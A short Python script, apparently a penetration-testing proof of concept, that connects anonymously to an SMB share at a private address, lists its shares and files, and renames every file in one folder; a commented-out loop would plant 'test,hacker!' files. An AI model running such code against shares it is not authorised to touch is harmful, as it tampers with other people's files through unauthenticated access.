#!/usr/bin/python3
# -*- coding:utf-8 -*-


from smb.SMBConnection import SMBConnection
from io import BytesIO
import random, string
import pysnooper

# 写文件
# @pysnooper.snoop()
def write_file(conn, service_name, path, content):
    file = BytesIO(content.encode())
    filename = "".join(random.sample(string.digits + string.ascii_letters,4)) + '_xq17666.txt'
    path = path +'/'+filename
    try:
        conn.storeFile(service_name, path, file)
        print(f"Write Success!:{content} > {path} ")
    except Exception as e:
        print(e)

# 列举共享目录
# @pysnooper.snoop()
def list_share(conn):
    print("Open Share:")
    # 获取共享的文件夹
    sharelist = conn.listShares(timeout=30)
    for i in sharelist:
        print(i.name)
    # 列出共享名下的文件

# @pysnooper.snoop()
def list_dir(conn, service_name, path):
    try:
        response = conn.listPath(service_name, path, timeout=30)
        for r in  response:
            print(r.filename)
        return response
    except Exception as e:
        print("[-] can't not access the resource!")

# 修改文件名
# @pysnooper.snoop()
def change_filename(conn, service_name, path):
    try:
        response = list_dir(conn, service_name, path)
        for r in response:
            if r.filename not in ['.', '..']:
                old_name = r.filename
                old_path = path + '/' + old_name
                # newname = '.'.join(oldname.split('.'))
                new_name = 'xq17666_' + old_name
                new_path = path + '/' + new_name
                conn.rename(service_name, old_path, new_path)
                # print(conn.getAttributes(service_name, old_path).isReadOnly)
                print(f"change_name Success {old_path}>{new_path}")
    except Exception as e:
        print(e)
        


def main():
    share_ip = '10.37.129.9'
    username = ''
    password = ''
    # 可以随意
    myname = 'hackerbox'
    # 可以随意
    remote_name = 'XQ1783FC'
    conn = SMBConnection(username, password, myname, remote_name, is_direct_tcp = True)
    assert conn.connect(share_ip, 445)
    list_share(conn)
    list_dir(conn, 'Users', '/xq17/share')
    change_filename(conn, 'Users', '/xq17/share')
    # for i in range(10):
        # write_file(conn, 'Users', '/xq17/share', 'test,hacker!')

if __name__ == '__main__':
    main()